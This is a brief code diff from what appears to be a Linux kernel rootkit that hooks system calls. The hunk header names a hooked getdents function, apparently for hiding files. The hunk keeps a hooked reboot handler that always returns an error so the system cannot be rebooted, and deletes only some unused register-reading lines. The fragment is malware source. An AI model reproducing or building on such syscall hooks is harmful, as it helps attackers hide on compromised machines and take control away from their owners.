@@ -170,11 +170,6 @@ static asmlinkage int hack_getdents(const struct pt_regs *regs){
 
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage int hack_reboot(const struct pt_regs *regs){
-    int magic1 = regs->di;
-    int magic2 = regs->si;
-    unsigned int cmd = regs->dx;
-    void *arg = regs->r10;
-    
     return -1; //return error when trying to reboot
 }
 #else
